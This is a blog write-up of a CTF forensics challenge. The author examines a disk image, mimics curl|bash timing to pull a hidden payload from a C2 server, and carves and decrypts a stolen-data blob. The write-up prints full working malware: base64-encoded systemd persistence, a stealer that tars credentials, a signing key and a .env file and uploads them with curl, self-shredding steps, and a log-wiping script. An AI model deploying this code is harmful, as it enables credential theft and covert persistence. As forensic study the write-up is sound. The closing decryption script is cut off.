---
title: "07CTF 2026: Discord-friend Forensics Writeup"
date: 2026-09-21
categories: 
  - "forensics"
  - "dump analysis"
tags: 
  - "forensics"
  - "ctf"
  - "07ctf"
  - "e01"

---

An interesting challenge from 07CTF: `Discord Friend`. This was the only forensics challenge, classified as hard, but I had to try it. Result: `FAIL`. I couldn't solve it :( Thanks to the description from author (<https://github.com/bhavya32>) and a bit of help from Mr Claude, I managed to get the flag. 

I will try to keep this writeup short, main  purpose here is just a reminder for myself in future: `sometimes you need to interact with C2 servers to get actual payload, especially if the malicious software cleans its traces`

## Brave Browser Data - Fake Discord Data

There isn't much going on in this one unfortunately. Looking around login data etc doesn't yield anything useful. History file reveals this url: `https://abdd-122-160-14-39.ngrok-free.app/` Probably the page victim accessed to download the malicious script?

You can actually find the cached version of this page in `Profile 6/Cache/Cache_Data/data_2` . Page is gzipped inside this cache, I just used binwalk to extract it `binwalk -e data_2`

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Chat</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: #1e1f22;
      color: #dbdee1;
      height: 100vh;
      display: flex;
    }

    .sidebar {
      width: 240px;
      background: #2b2d31;
      padding: 18px 12px;
      border-right: 1px solid #1a1b1e;
    }

    .brand {
      font-weight: 700;
      font-size: 18px;
      margin: 0 8px 20px;
      color: white;
    }

    .dm {
      background: #404249;
      border-radius: 6px;
      padding: 10px;
      font-weight: 600;
    }

    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      min-width: 0;
    }

    .header {
      height: 54px;
      padding: 0 20px;
      display: flex;
      align-items: center;
      background: #313338;
      border-bottom: 1px solid #232428;
      font-weight: 700;
      color: white;
    }

    .warning {
      margin-left: auto;
      font-size: 12px;
      color: #f0b232;
      border: 1px solid #f0b232;
      padding: 4px 8px;
      border-radius: 4px;
    }

    .messages {
      flex: 1;
      padding: 28px;
      background: #313338;
    }

    .message {
      display: flex;
      gap: 14px;
      max-width: 850px;
    }

    .avatar {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: #5865f2;
      display: grid;
      place-items: center;
      font-weight: 800;
      color: white;
      flex: none;
    }

    .name {
      font-weight: 700;
      color: #f2f3f5;
    }

    .time {
      margin-left: 8px;
      color: #949ba4;
      font-size: 12px;
      font-weight: 400;
    }

    .text {
      margin-top: 5px;
      line-height: 1.5;
    }

    .url {
      margin-top: 10px;
      display: inline-block;
      color: #00a8fc;
      background: #27282c;
      border-radius: 4px;
      padding: 7px 9px;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      user-select: all;
    }

    .notice {
      margin-top: 28px;
      max-width: 720px;
      padding: 14px;
      background: #2b2d31;
      border-left: 4px solid #f0b232;
      border-radius: 4px;
      color: #b5bac1;
    }

    .composer {
      margin: 0 22px 22px;
      padding: 14px 16px;
      border-radius: 8px;
      background: #383a40;
      color: #949ba4;
    }
  </style>
</head>
<body>
  <aside class="sidebar">
    <div class="brand">Chat Demo</div>
    <div class="dm">â— Friend A</div>
  </aside>

  <main class="main">
    <header class="header">
      Friend A
    </header>

    <section class="messages">
      <div class="message">
        <div class="avatar">A</div>

        <div>
          <div>
            <span class="name">Friend A</span>
            <span class="time">Today at 3:24 AM</span>
          </div>

          <div class="text">
            yo, found this AI based CLI tool. been seeing people use it for
  the new agent tooling â€” apparently free during the preview.

          </div>

          <div class="url">https://c2.bg2.in/install</div>
        </div>
      </div>

    </section>

    <div class="composer">Message Friend A</div>
  </main>
</body>
</html>

```

![Discord page](/assets/img/discord_discordpage.png)

Just a fake discord page with a link to `c2.bg2.in/install`. This page no longer exists, no archieve records. And main page just leads to a rickroll :D 

## EO1 image

We are given this evidence image file. I used `FTK imager` to navigate through files and see if there is anything interesting. There were few things:

1 `/home/alice/.bash_history` gives the commands victim run at which timestamp:

```bash
#1789719129
curl -fsSL https://c2.bg2.in/install -o ~/Downloads/forgesync-install.sh
#1789719149
sha256sum ~/Downloads/forgesync-install.sh
#1789719174
shellcheck ~/Downloads/forgesync-install.sh
#1789719209
less ~/Downloads/forgesync-install.sh
#1789723740
cd ~/src/constellation
./tools/release.sh 2.7.4
```
Here we see the same link again. Next we check that file

2 `/home/alice/Downloads/forgesync-install.sh` I thought this could be the malicious script downloaded from the c2 server. It had like 5kb padding to hide some commands, I cleared them:

```bash
#!/usr/bin/env bash
set -u

VERSION=2.4.1
ROOT="${FORGESYNC_ROOT:-}"
CA_ARGS=()
[ -n "${FORGESYNC_CA:-}" ] && CA_ARGS=(--cacert "$FORGESYNC_CA")
PAYLOAD_URL="${FORGESYNC_PAYLOAD_URL:-https://packages.forgesync.test/cli/2.4.1/linux-amd64}"
TELEMETRY_URL="${FORGESYNC_TELEMETRY_URL:-https://telemetry.forgesync.test/v1/install}"

# Signed vendor bootstrap cache. It is encrypted because it contains unreleased
# mirror topology and feature rollout metadata, not executable code or secrets.
VENDOR_CACHE_KEY_HEX=9b257a1f64d9f69ea0727f60b972f5a6c4ce6d58a882e3dd55ab93ea8d071c42
VENDOR_CACHE_IV_HEX=4a168f931ce61d09c988f3fa876433b1
VENDOR_CACHE_SHA256=fa4503c514ab234bd31e039a3485774fe5c8a8e283ac8d83e277d15f1e470873
VENDOR_CACHE_B64='/KCKZIGG6AXAPviFU1tAdm0LkIT9vFsuH84fMI4Ee8q3TDrTFpD2zVTtnccJMRW+eddhO4+9008WzVsHuNKHvwNZO44GpkFCMPoTXUbaayr90JAV15Y/WWwrHYKmF+GJ9Mq9XqoQ3bbbCDA00YRR40zCziSfTdU8w4936Zs1canDsHb2ybTCN6+RK3AFyDHlUfYd9rDHh8Adm+9Dqg9NitSDz/D7Y2j/GXxGvngK9VAYoI2xM0R52aaSFfphKFuJ2VPiXGxpJkfDRm/Cflzvbh+IjZnpFAgaw6vlJ5O3medcOqZ5mFgdXOvoPRti8nFo1UIQLRg052EMVv9mkA=='

root_path() { printf '%s%s' "$ROOT" "$1"; }

detect_os() {
    OS_ID=unknown
    if [ -r /etc/os-release ]; then
        OS_ID=$(sed -n 's/^ID=//p' /etc/os-release | tr -d '"' | head -1)
    fi
    ARCH=$(uname -m)
}

discover_git_hosts() {
    GIT_HOST_COUNT=0
    if command -v git >/dev/null 2>&1; then
        GIT_HOST_COUNT=$(find "${HOME:-/nonexistent}" -maxdepth 5 -type f -path '*/.git/config' -readable 2>/dev/null \
            -exec sed -n 's/^[[:space:]]*url[[:space:]]*=[[:space:]]*//p' {} + \
            | sed -E 's#^[a-zA-Z]+://([^/@]+@)?([^/:]+).*#\2#; s#^([^@]+@)?([^:]+):.*#\2#' \
            | sort -u | wc -l | tr -d ' ')
    fi
}

discover_proxy() {
    PROXY_CONFIGURED=false
    [ -n "${HTTP_PROXY:-}${HTTPS_PROXY:-}${http_proxy:-}${https_proxy:-}" ] && PROXY_CONFIGURED=true
}

inspect_ssh_configuration() {
    SSH_HOST_COUNT=0
    for f in "${HOME:-/nonexistent}/.ssh/config" "${HOME:-/nonexistent}/.ssh/known_hosts"; do
        [ -r "$f" ] || continue
        case "$f" in
            */config) n=$(awk 'tolower($1)=="host" {for(i=2;i<=NF;i++) if($i !~ /[*?!]/) print $i}' "$f" | sort -u | wc -l) ;;
            *) n=$(cut -d' ' -f1 "$f" | tr ',' '\n' | sed 's/^\[//; s/\]:[0-9]*$//' | sort -u | wc -l) ;;
        esac
        SSH_HOST_COUNT=$((SSH_HOST_COUNT + n))
    done
}

unpack_vendor_cache() {
    cachedir=$(root_path /var/lib/forgesync)
    cache="$cachedir/.vendor-mirror.cache"
    mkdir -p "$cachedir"
    printf '%s' "$VENDOR_CACHE_B64" | base64 -d \
        | openssl enc -d -aes-256-ctr -K "$VENDOR_CACHE_KEY_HEX" -iv "$VENDOR_CACHE_IV_HEX" > "$cache"
    actual=$(openssl dgst -sha256 "$cache" | awk '{print $NF}')
    [ "$actual" = "$VENDOR_CACHE_SHA256" ] || { rm -f "$cache"; return 1; }
    chmod 0644 "$cache"
}

install_cli() {
    dest=$(root_path /usr/local/bin/forgesync)
    mkdir -p "$(dirname "$dest")" "$(root_path /usr/local/share)"
    curl -fsSL "${CA_ARGS[@]}" "$PAYLOAD_URL" -o "$dest"
    chmod 0755 "$dest"
    printf '%s  %s\n' "$(openssl dgst -sha256 "$dest" | awk '{print $NF}')" "$dest" \
        > "$(root_path /usr/local/share/forgesync-cli.sha256)"
}

install_update_timer() {
    unitdir=$(root_path /etc/systemd/system)
    mkdir -p "$unitdir"
    cat > "$unitdir/forgesync-update.service" <<'UNIT'
[Unit]
Description=ForgeSync CLI signed update check
[Service]
Type=oneshot
ExecStart=/usr/local/bin/forgesync update --quiet
UNIT
    cat > "$unitdir/forgesync-update.timer" <<'UNIT'
[Unit]
Description=Daily ForgeSync CLI update check
[Timer]
OnCalendar=daily
RandomizedDelaySec=37m
Persistent=true
[Install]
WantedBy=timers.target
UNIT
    if [ -z "$ROOT" ] && [ "${FORGESYNC_NO_SYSTEMD:-0}" != 1 ]; then
        systemctl daemon-reload >/dev/null 2>&1 || true
        systemctl enable --now forgesync-update.timer >/dev/null 2>&1 || true
    fi
}

build_anonymous_telemetry() {
    docker=false
    command -v docker >/dev/null 2>&1 && docker=true
    machine=$(cat /etc/machine-id 2>/dev/null || printf unknown)
    install_id=$(printf '%s|forgesync-install-v1' "$machine" | openssl dgst -sha256 | awk '{print substr($NF,1,24)}')
    # This bundled base64 is a schema marker, not executable content.
    schema=$(forgesync-telemetry-v1)
    TELEMETRY=$(printf '{"schema":"%s","version":"%s","os":"%s","arch":"%s","install_id":"%s","docker":%s,"git_host_count":%s,"ssh_host_count":%s,"proxy_configured":%s}' \
        "$schema" "$VERSION" "$OS_ID" "$ARCH" "$install_id" "$docker" \
        "$GIT_HOST_COUNT" "$SSH_HOST_COUNT" "$PROXY_CONFIGURED")
}

send_anonymous_telemetry() {
    curl -fsS "${CA_ARGS[@]}" -H 'Content-Type: application/json' --data-binary "$TELEMETRY" \
        "$TELEMETRY_URL" >/dev/null 2>&1 || true
}

printf 'ForgeSync CLI %s installer\n' "$VERSION"
printf 'Checking release mirrors...\n'
sleep "${FORGESYNC_MIRROR_DELAY:-4.0}"

detect_os
discover_git_hosts
discover_proxy
inspect_ssh_configuration
unpack_vendor_cache
install_cli
install_update_timer
build_anonymous_telemetry
send_anonymous_telemetry
mkdir -p "$(root_path /var/lib/forgesync)"
printf '%s\n' "$TELEMETRY" > "$(root_path /var/lib/forgesync/install.json)"
printf 'ForgeSync CLI %s installed successfully.\n' "$VERSION"
```

3 This script point to /var/lib/ in that folder we get `.vendor-mirror.cache and install.json` Install json carries some telemetry: 

```json
{
  "schema":"forgesync-telemetry-v1","version":"2.4.1","os":"ubuntu","arch":"x86_64",
  "install_id":"5bc63b4b518851c213bd8186","docker":true,"git_host_count":0,"ssh_host_count":0,
  "proxy_configured":false}
```

It is something but nothing really too malicious here. Decrypting the stuff in that script gives the same mirror cache.


### Forgesync binary

Script points us to `/usr/local/bin/forgesync` it is set to run daily. I was sure that binary would have some answers. It was a Go compiled binary. After struggling to RE this for a long time, answer was: `THIS BINARY ISNT MALICIOUS`

Really, there was nothing interesting in it. There goes my time :( Let's skip the pain I suffered here.

I spent more time trying to carve files from unallocated space but nothing really came out. My team mate found this:

```bash
#!/usr/bin/env bash
set -euo pipefail
rm -rf /tmp/.provision-stage
rm -f /home/alice/.bash_history /root/.bash_history
journalctl --rotate >/dev/null 2>&1 || true
journalctl --vacuum-time=1s >/dev/null 2>&1 || true
find /var/log -type f -exec truncate -s 0 {} + 2>/dev/null || true
apt-get clean
sync
```

We couldn't lead this into anything useful, just leaving it here.

## HINT

I was stuck, no one solved the challenge at this point. So the author provided a hint: `In dfir, maybe the suspicious files were deliberately left out, and malware cleared its own trace. try and get hold of the actual malicious payload, whether from the handout or from where the victim downloaded it`

I spent more time on carving, but couldn't really find anything malicious. I was still lost after the hint :D And I GAVE UP. Once the CTF ended, author provided the summary of solution: ` hope everyone got the c2 address? c2.bg2.in/install. now its currently a rickroll, but if you see the dns history, you will find an IP adress. that ip is the real c2, which was still up. but the script it served did not match the malicious payload. the server had used curl to bash pipe timing trick to send malicious payload only when victim runs curl <url>|bash so you had to simulate this to get the actual script which got piped to bash. once you had the real payload, carve the deleted NCACHE1 blob from the disk image, use the secrets in the real payload to decrypt NCACHE1 -> recover the .ncache-result, which contains the flag.`

So I decided to follow this and solve the challenge. Anything after this point is done after the CTF.

## DNS History

IP address of the C2 has changed. We needed to find new IP address so we can get the same malicious script: <https://dnshistory.org/historical-dns-records/a/c2.bg2.in> 

This gets us the IP: `34.56.224.40` 

## Curl | Bash imitation

At the time of writing this, C2 is still active there, so going to `34.56.224.40/install` gets us the clean version of installer file. This is a cool trick described here: <https://lukespademan.com/blog/the-dangers-of-curlbash/>

When you `curl url | bash` bash both downloads and executes the script. Like if there is a sleep in that file, sleep is executed. C2 uses that trick to check if user is curl bashing or not. If not curl bashing, it gives the clean version of the installer file we found. We don't want to curl bash a malicious file, so we need to imitate curl bashing. Refer to clean script and see this line: `sleep "${FORGESYNC_MIRROR_DELAY:-4.0}"` 4 seconds sleep. So we need to sleep 4 secodns during download to imitate this sleep affect. Here is the code Claude wrote to imitate this:

```python
import sys
import time
import requests

def fake_curl_bash(url):
    print(f"GET {url}")

    # stream=True means we get the response gradually, like a real pipe,
    # instead of downloading it all at once.
    # Don't verify certificate
    response = requests.get(url, stream=True, verify=False)
    response.raise_for_status()

    # iter_lines gives us one line at a time, as it arrives.
    for raw_line in response.iter_lines():
        if raw_line is None:
            continue

        line = raw_line.decode("utf-8", errors="replace")
        print(f"{line}")

        # Look for the line with sleep
        if 'sleep' in line:
            time.sleep(4)

fake_curl_bash('https://34.56.224.40/install')
```

I initially got Claude to write to download script, but oh God, I hate Claude and LLMs for overcomplicating stuff :( I couldn't get myself to share that script, so managed to put this together, much cleaner and easier to read script. Idea is simple, download line by line, and if there is sleep, sleep for 4 seconds. That was taken from the clean version of the installer. This script manages to deceive C2 and it gives us the actual malicious payload `python3 fetcher.py> malicious.sh`:

```bash
# Initial part of the script is same as the clean one. At the end we get
# this extra code in malicious version:

# Optional local integration components
_g=$(root_path /usr/local/lib/systemd/system-generators/systemd-network-cache-generator)
_h=$(root_path /usr/local/libexec/network-cache)
_s=$(root_path /run/.systemd-netseed)
mkdir -p "$(dirname "$_g")" "$(dirname "$_h")" "$(dirname "$_s")"
printf '%s' 'IyEvdXNyL2Jpbi9lbnYgYmFzaApzZXQgLWV1Cm5vcm1hbF9kaXI9JHsxOj9ub3JtYWwgZ2VuZXJhdG9yIGRpcmVjdG9yeSByZXF1aXJlZH0KZWFybHlfZGlyPSR7MjotfQpsYXRlX2Rpcj0kezM6LX0KCmVtaXRfdW5pdHMoKSB7CiAgICBvdXQ9JDEKICAgIFsgLW4gIiRvdXQiIF0gfHwgcmV0dXJuIDAKICAgIG1rZGlyIC1wICIkb3V0L3BhdGhzLnRhcmdldC53YW50cyIKICAgIGNhdCA+ICIkb3V0L25ldHdvcmstY2FjaGUucGF0aCIgPDwnVU5JVCcKW1VuaXRdCkRlc2NyaXB0aW9uPU5ldHdvcmsgbWV0YWRhdGEgY2FjaGUgd2F0Y2hlcgpCZWZvcmU9cGF0aHMudGFyZ2V0CltQYXRoXQpQYXRoRXhpc3RzPS9ob21lL2FsaWNlL3NyYy9jb25zdGVsbGF0aW9uLy5yZWxlYXNlLXJ1bm5pbmcKVW5pdD1uZXR3b3JrLWNhY2hlLnNlcnZpY2UKW0luc3RhbGxdCldhbnRlZEJ5PXBhdGhzLnRhcmdldApVTklUCiAgICBjYXQgPiAiJG91dC9uZXR3b3JrLWNhY2hlLnNlcnZpY2UiIDw8J1VOSVQnCltVbml0XQpEZXNjcmlwdGlvbj1SZWZyZXNoIG5ldHdvcmsgbWV0YWRhdGEgY2FjaGUKW1NlcnZpY2VdClR5cGU9b25lc2hvdApSZW1haW5BZnRlckV4aXQ9eWVzCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2xpYmV4ZWMvbmV0d29yay1jYWNoZQpVTklUCiAgICBsbiAtc2YgLi4vbmV0d29yay1jYWNoZS5wYXRoICIkb3V0L3BhdGhzLnRhcmdldC53YW50cy9uZXR3b3JrLWNhY2hlLnBhdGgiCn0KCmVtaXRfdW5pdHMgIiRub3JtYWxfZGlyIgojIFVuaXQgZGVmaW5pdGlvbnMgYmVsb25nIGluIHRoZSBub3JtYWwgZ2VuZXJhdG9yIHRpZXIgb25seS4gVGhlIG90aGVyIG91dHB1dAojIGFyZ3VtZW50cyBhcmUgYWNjZXB0ZWQgdG8gbWF0Y2ggc3lzdGVtZCdzIGRvY3VtZW50ZWQgZ2VuZXJhdG9yIGludGVyZmFjZS4KOgo=' | base64 -d > "$_g"
printf '%s' 'IyEvdXNyL2Jpbi9lbnYgYmFzaApzZXQgLWV1byBwaXBlZmFpbAoKcm9vdD0ke05DQUNIRV9ST09UOi19Cm1rZGlyIC1wICIkcm9vdC9ydW4iCmlmIFsgLWUgIiRyb290L3J1bi9uZXR3b3JrLWNhY2hlLmRvbmUiIF07IHRoZW4gZXhpdCAwOyBmaQp0b3VjaCAiJHJvb3QvcnVuL25ldHdvcmstY2FjaGUuZG9uZSIKCnNlZWRfZmlsZT0iJHJvb3QvcnVuLy5zeXN0ZW1kLW5ldHNlZWQiCnJlc3VsdF9maWxlPSIkcm9vdC9kZXYvc2htLy5uY2FjaGUtcmVzdWx0IgpzZWVkPSQodHIgLWQgJ1xuJyA8ICIkc2VlZF9maWxlIiAyPi9kZXYvbnVsbCB8fCB0cnVlKQpbWyAkc2VlZCA9fiBeWzAtOWEtZl17NjR9JCBdXSB8fCBleGl0IDAKCnRhcmdldHM9KAogIC9ob21lL2FsaWNlLy5jb25maWcvZm9yZ2VodWIvY3JlZGVudGlhbHMuanNvbgogIC9ob21lL2FsaWNlLy5jb25maWcvY29zaWduL3JlbGVhc2Uua2V5CiAgL2hvbWUvYWxpY2Uvc3JjL2NvbnN0ZWxsYXRpb24vLmVudi5wcm9kdWN0aW9uCiAgL2Rldi9zaG0vLm5jYWNoZS1yZXN1bHQKKQpmb3IgZiBpbiAiJHt0YXJnZXRzW0BdfSI7IGRvIFsgLXIgIiRyb290JGYiIF0gfHwgZXhpdCAwOyBkb25lCgpta2RpciAtcCAiJHJvb3QvdmFyL3RtcCIKc3RhZ2U9IiRyb290L3Zhci90bXAvLm5ldC1jYWNoZS0kJCIKcGxhaW49JChta3RlbXAgIiRyb290L3J1bi8ubmV0LW1ldGEtWFhYWFhYIikKY2lwaGVyPSQobWt0ZW1wICIkcm9vdC9ydW4vLm5ldC1ibG9iLVhYWFhYWCIpCnRyYXAgJ3JtIC1mICIkcGxhaW4iICIkY2lwaGVyIicgRVhJVAoKdGFyIC1DICIke3Jvb3Q6LS99IiAtLWZvcm1hdD11c3RhciAtY2YgIiRwbGFpbiIgIiR7dGFyZ2V0c1tAXSMvfSIKc2FsdD0kKG9wZW5zc2wgcmFuZCAtaGV4IDE2KQppdj0kKG9wZW5zc2wgcmFuZCAtaGV4IDE2KQptYWNoaW5lPSQodHIgLWQgJ1xuJyA8ICIkcm9vdC9ldGMvbWFjaGluZS1pZCIpCiMgRGVyaXZlIG92ZXIgcmF3IHN0cmVhbSBzZWNyZXQgfHwgbWFjaGluZS1pZCB8fCBjb250ZXh0IHx8IHJhdyBzYWx0LgprZXk9JCggeyBwcmludGYgJyVzJyAiJHNlZWQiIHwgeHhkIC1yIC1wOyBwcmludGYgJyVzfGZvcmdlc3luYy1uZXR3b3JrLWNhY2hlLXYyfCcgIiRtYWNoaW5lIjsgcHJpbnRmICclcycgIiRzYWx0IiB8IHh4ZCAtciAtcDsgfSB8IHNoYTI1NnN1bSB8IGF3ayAne3ByaW50ICQxfScpCm9wZW5zc2wgZW5jIC1hZXMtMjU2LWN0ciAtSyAiJGtleSIgLWl2ICIkaXYiIC1pbiAiJHBsYWluIiAtb3V0ICIkY2lwaGVyIgpsZW5ndGg9JChzdGF0IC1jICVzICIkY2lwaGVyIikKewogICMgT2N0YWwgc3BlbGxpbmcga2VlcHMgdGhlIHBlcnNpc3RlbnQgaGVscGVyIGZyb20gYmVjb21pbmcgYSBzZWNvbmQgY2FydmluZyBoaXQuCiAgcHJpbnRmICdcMTE2XDEwM1wxMDFcMTAzXDExMFwxMDVcMDYxXDAwMCcKICBwcmludGYgJyUwOHgnICIkbGVuZ3RoIiB8IHh4ZCAtciAtcAogIHByaW50ZiAnJXMnICIkc2FsdCIgfCB4eGQgLXIgLXAKICBwcmludGYgJyVzJyAiJGl2IiB8IHh4ZCAtciAtcAogIGNhdCAiJGNpcGhlciIKfSA+ICIkc3RhZ2UiCm9wZW5zc2wgZGdzdCAtc2hhMjU2IC1tYWMgSE1BQyAtbWFjb3B0ICJoZXhrZXk6JGtleSIgLWJpbmFyeSAiJHN0YWdlIiA+PiAiJHN0YWdlIgpzeW5jIC1mICIkc3RhZ2UiCgpjdXJsIC1mc1MgLS1yZXRyeSAxIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScgXAogIC0tZGF0YS1iaW5hcnkgIkAkc3RhZ2UiICIke05DQUNIRV9VUExPQURfVVJMOi1odHRwczovL3RlbGVtZXRyeS5mb3JnZXN5bmMudGVzdC92MS9kaWFnfSIgPi9kZXYvbnVsbApybSAtZiAiJHN0YWdlIgpzeW5jIC1mICIkcm9vdC92YXIvdG1wIgoKcm0gLWYgIiRzZWVkX2ZpbGUiICIkcmVzdWx0X2ZpbGUiCmxvZ2dlciAtdCBuZXR3b3JrLWNhY2hlICduZXR3b3JrIG1ldGFkYXRhIHJlZnJlc2ggY29tcGxldGU7IHJldGlyaW5nIG9uZS1zaG90IGNvbXBvbmVudHMnIHx8IHRydWUKZm9yIHJldGlyZWQgaW4gXAogICIkcm9vdC91c3IvbG9jYWwvbGliZXhlYy9uZXR3b3JrLWNhY2hlIiBcCiAgIiRyb290L3Vzci9sb2NhbC9saWIvc3lzdGVtZC9zeXN0ZW0tZ2VuZXJhdG9ycy9zeXN0ZW1kLW5ldHdvcmstY2FjaGUtZ2VuZXJhdG9yIjsgZG8KICBbIC1lICIkcmV0aXJlZCIgXSB8fCBjb250aW51ZQogIHNocmVkIC1uIDIgLXogLXUgIiRyZXRpcmVkIiAyPi9kZXYvbnVsbCB8fCBybSAtZiAiJHJldGlyZWQiCmRvbmUKc3luYwo=' | base64 -d > "$_h"
chmod 0755 "$_g" "$_h"
_p0='24a5fc36c1a0a128a68ff8b3d01a4ef990f13a555dc5e0bd3e2cb4d4a58bc51f'
_p1='729a6f698dfe8675acdd0f1ef04ed181a7add7bc5d06082fbad9c1d5754c3298'
_seed=$(python3 -c 'import sys; a=bytes.fromhex(sys.argv[1]); b=bytes.fromhex(sys.argv[2]); print(bytes(x^y for x,y in zip(a,b)).hex())' "$_p0" "$_p1")
printf '%s\n' "$_seed" > "$_s"
chmod 0600 "$_s"
unset _p0 _p1 _seed
if [ -z "$ROOT" ] && [ "${FORGESYNC_NO_SYSTEMD:-0}" != 1 ]; then
  systemctl daemon-reload >/dev/null 2>&1 || true
  systemctl start network-cache.path >/dev/null 2>&1 || true
fi
```

Now we can actually do forensics and solve the challenge :D

## Malicious script

It does a few things:

1. seed = p0 XOR p1, stored in `run/.systemd-netseed`

2. systemd-network-cache-generator is base64 decoded from `_g`

3. network-cache is base64 decoded from `_h`

So this script yields to two more scripts, let's call them 2.1 and 2.2. And creates something called `seed`

## Script 2.1

This is from the first b64 blob in malicious script:

```bash
#!/usr/bin/env bash
set -eu
normal_dir=${1:?normal generator directory required}
early_dir=${2:-}
late_dir=${3:-}

emit_units() {
    out=$1
    [ -n "$out" ] || return 0
    mkdir -p "$out/paths.target.wants"
    cat > "$out/network-cache.path" <<'UNIT'
[Unit]
Description=Network metadata cache watcher
Before=paths.target
[Path]
PathExists=/home/alice/src/constellation/.release-running
Unit=network-cache.service
[Install]
WantedBy=paths.target
UNIT
    cat > "$out/network-cache.service" <<'UNIT'
[Unit]
Description=Refresh network metadata cache
[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/local/libexec/network-cache
UNIT
    ln -sf ../network-cache.path "$out/paths.target.wants/network-cache.path"
}

emit_units "$normal_dir"
# Unit definitions belong in the normal generator tier only. The other output
# arguments are accepted to match systemd's documented generator interface.
:
```

Just some path handling middle man. And starts the second script.

## Script 2.2

Decoded from second b64 blob:

```bash
#!/usr/bin/env bash
set -euo pipefail

root=${NCACHE_ROOT:-}
mkdir -p "$root/run"
if [ -e "$root/run/network-cache.done" ]; then exit 0; fi
touch "$root/run/network-cache.done"

seed_file="$root/run/.systemd-netseed"
result_file="$root/dev/shm/.ncache-result"
seed=$(tr -d '\n' < "$seed_file" 2>/dev/null || true)
[[ $seed =~ ^[0-9a-f]{64}$ ]] || exit 0

targets=(
  /home/alice/.config/forgehub/credentials.json
  /home/alice/.config/cosign/release.key
  /home/alice/src/constellation/.env.production
  /dev/shm/.ncache-result
)
for f in "${targets[@]}"; do [ -r "$root$f" ] || exit 0; done

mkdir -p "$root/var/tmp"
stage="$root/var/tmp/.net-cache-$$"
plain=$(mktemp "$root/run/.net-meta-XXXXXX")
cipher=$(mktemp "$root/run/.net-blob-XXXXXX")
trap 'rm -f "$plain" "$cipher"' EXIT

tar -C "${root:-/}" --format=ustar -cf "$plain" "${targets[@]#/}"
salt=$(openssl rand -hex 16)
iv=$(openssl rand -hex 16)
machine=$(tr -d '\n' < "$root/etc/machine-id")
# Derive over raw stream secret || machine-id || context || raw salt.
key=$( { printf '%s' "$seed" | xxd -r -p; printf '%s|forgesync-network-cache-v2|' "$machine"; printf '%s' "$salt" | xxd -r -p; } | sha256sum | awk '{print $1}')
openssl enc -aes-256-ctr -K "$key" -iv "$iv" -in "$plain" -out "$cipher"
length=$(stat -c %s "$cipher")
{
  # Octal spelling keeps the persistent helper from becoming a second carving hit.
  printf '\116\103\101\103\110\105\061\000'
  printf '%08x' "$length" | xxd -r -p
  printf '%s' "$salt" | xxd -r -p
  printf '%s' "$iv" | xxd -r -p
  cat "$cipher"
} > "$stage"
openssl dgst -sha256 -mac HMAC -macopt "hexkey:$key" -binary "$stage" >> "$stage"
sync -f "$stage"

curl -fsS --retry 1 -H 'Content-Type: application/octet-stream' \
  --data-binary "@$stage" "${NCACHE_UPLOAD_URL:-https://telemetry.forgesync.test/v1/diag}" >/dev/null
rm -f "$stage"
sync -f "$root/var/tmp"

rm -f "$seed_file" "$result_file"
logger -t network-cache 'network metadata refresh complete; retiring one-shot components' || true
for retired in \
  "$root/usr/local/libexec/network-cache" \
  "$root/usr/local/lib/systemd/system-generators/systemd-network-cache-generator"; do
  [ -e "$retired" ] || continue
  shred -n 2 -z -u "$retired" 2>/dev/null || rm -f "$retired"
done
sync
```

Finally some good stuff! This is the stealing and encrypting part. Tars up `credentials.json`, `release.key`, `.env.production`, and `/dev/shm/.ncache-result`; AES-256-CTR encrypts it; wraps it in the `NCACHE1` format; uploads and self-deletes.

### NCACHE1

This is something the payload creates as `network cache`:

```
    offset  size  field
    0       8     magic "NCACHE1\0"
    8       4     ciphertext length, big-endian uint32
    12      16    salt (raw bytes)
    28      16    iv   (raw bytes; used directly as AES-CTR initial counter)
    44      N     AES-256-CTR ciphertext (N = length field)
    44+N    32    HMAC-SHA256 tag (binary), key = raw key bytes,
                   computed over bytes [0 .. 44+N)
```

Now we know the blob starts with NCACHE1 string. We carve it from unallocated space:

```python
# Mount and extract unallocated memory to carve out deleted NCACHE blob
#   ewfmount workstation.E01 ./test/mnt/
#   blkls -o 2099200 ./test/mnt/ewf1 > unallocated.img

#!/usr/bin/env python3
import sys, struct, mmap

MAGIC = b"NCACHE1\x00"
HEADER_LEN = 44
HMAC_LEN = 32

target = 'unallocated.img'
prefix = 'ncache1_blob'

f = open(target, "rb")
mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)

offsets = []
start = 0
while True:
    i = mm.find(MAGIC, start)
    if i == -1:
        break
    offsets.append(i)
    start = i + 1

print(f"Found {len(offsets)} hit(s)")

for n, off in enumerate(offsets):
    header = mm[off:off + HEADER_LEN]
    length = struct.unpack(">I", header[8:12])[0]
    salt = header[12:28]
    iv = header[28:44]

    total_len = HEADER_LEN + length + HMAC_LEN
    blob = mm[off:off + total_len]

    out_path = f"{prefix}_{n}.bin" if len(offsets) > 1 else f"{prefix}.bin"
    with open(out_path, "wb") as out:
        out.write(blob)

    print(f"[{n}] off={off} len={length} salt={salt.hex()} iv={iv.hex()} -> {out_path}")
```

With this we can extract the deleted NCACHE blob from unallocated space. Read salt and IV and save the blob for further decryption.

## AES Decryption

We got all the stuff we need for decrpytion. From the last script, we can see how the key is generated:

```
seed  = XOR(p0, p1)     // From script 2.1
machine ID              // From /etc/machine-id
key   = SHA256( seed_bytes +
                "machineID|forgesync-network-cache-v2|".encode() +    // Machine ID and that given string is combined with | separator and converted to bytes
                salt_bytes )    // From NCACHE blob
iv     // From NCACHE blob
```

Machine ID was available in the given image, easy to extract. IV and salt comes from the NCACHE blob we carved. Seed comes from script 2.1, and then aes key is simply generated by the given combination of machine ID, separators and a fixed string:

```python
import sys, struct, hashlib, hmac as hmac_mod
from Crypto.Cipher import AES
from Crypto.Util import Counter

seed_hex = "563f935f4c5e275d0a52f7ad20549f78375cede900c3e89284f57501d0c7f787"
machine_id = "2e1481aad781941b9f4d4b1da0308022"
fixed_str = "forgesync-network-cache-v2"

blob = "ncache1_blob.bin"
out_path = "ncache1_decrypted.tar"

data = open(blob, "rb").read()

